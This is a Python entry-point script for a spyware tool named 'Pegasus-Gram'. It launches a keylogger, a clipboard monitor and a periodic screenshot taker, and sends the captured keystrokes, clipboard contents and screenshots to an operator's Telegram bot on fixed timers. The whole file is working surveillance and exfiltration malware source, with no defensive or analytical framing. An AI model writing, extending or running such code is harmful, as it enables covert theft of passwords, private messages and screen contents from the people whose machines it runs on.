import asyncio
import config  # Import the configuration
import logging # Import logging module
from error_logger import setup_logging # Import setup function
from telegram_utils import send_telegram_message, send_telegram_photo # Import photo sender
from keylogger import start_keyboard_listener, key_sender # Import keylogger functions
from clipboard_monitor import check_clipboard # Import clipboard monitor function
from screenshot_taker import take_screenshots # Import screenshot taker

# Set up logging first
setup_logging()

async def main():
    logging.info("Pegasus-Gram starting...") # Use logging instead of print
    print("Pegasus-Gram starting...") # Keep print for console visibility during startup

    # Send a startup message to Telegram
    startup_message = "Pegasus-Gram instance started."
    # Use asyncio.create_task for the initial message to avoid blocking startup
    asyncio.create_task(send_telegram_message(config.TELEGRAM_BOT_TOKEN, config.TELEGRAM_CHAT_ID, startup_message))

    # Start the keyboard listener thread (synchronous call)
    start_keyboard_listener()

    # Create an asyncio task for the key sender coroutine
    key_sender_task = asyncio.create_task(
        key_sender(send_telegram_message, config.TELEGRAM_BOT_TOKEN, config.TELEGRAM_CHAT_ID, interval=60)
    )

    # Create asyncio tasks for background monitoring
    clipboard_monitor_task = asyncio.create_task(
        check_clipboard(send_telegram_message, config.TELEGRAM_BOT_TOKEN, config.TELEGRAM_CHAT_ID, interval=10)
    )
    screenshot_taker_task = asyncio.create_task(
        take_screenshots(
            send_photo_func=send_telegram_photo,
            bot_token=config.TELEGRAM_BOT_TOKEN,
            chat_id=config.TELEGRAM_CHAT_ID,
            interval=300,
            send_text_func=send_telegram_message # Pass text sender for error reporting
            )
    )

    logging.info("Keylogger, Clipboard Monitor, Screenshot Taker, and Telegram sender are running.")
    print("Keylogger, Clipboard Monitor, Screenshot Taker, and Telegram sender are running.")

    # Keep the main async loop running
    # Gather tasks to wait for them upon shutdown
    monitor_tasks = [key_sender_task, clipboard_monitor_task, screenshot_taker_task]

    try:
        # This will keep running until one of the tasks finishes or is cancelled
        # Or we can stick with sleep(inf) if we don't need to wait for tasks specifically
        # await asyncio.gather(*monitor_tasks)
        await asyncio.sleep(float('inf')) # Keep running until Ctrl+C
    finally:
        logging.info("Shutting down...")
        print("Shutting down...")
        # Cancel all monitoring tasks
        for task in monitor_tasks:
            task.cancel()
        # Wait for tasks to finish cancelling
        await asyncio.gather(*monitor_tasks, return_exceptions=True)
        logging.info("Monitoring tasks cancelled.")
        print("Monitoring tasks cancelled.")
        # Note: Stopping the pynput listener thread cleanly might need refinement
        # stop_keyboard_listener() # This function might need adjustment for async context


if __name__ == "__main__":
    # Initial check from config is synchronous, happens on import
    if config.TELEGRAM_BOT_TOKEN != "YOUR_BOT_TOKEN_HERE" and config.TELEGRAM_CHAT_ID != "YOUR_CHAT_ID_HERE":
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            logging.info("Pegasus-Gram stopped by user (Ctrl+C).")
            print("\nPegasus-Gram stopped by user (Ctrl+C).")
        except Exception as e:
            logging.critical(f"An unexpected error occurred in main loop: {e}", exc_info=True)
            print(f"An unexpected critical error occurred in main loop: {e}")
    else:
        # The warning is already printed by config.py
        logging.warning("Exiting because config.py placeholders were not replaced.")
        print("Exiting because config.py placeholders were not replaced.") 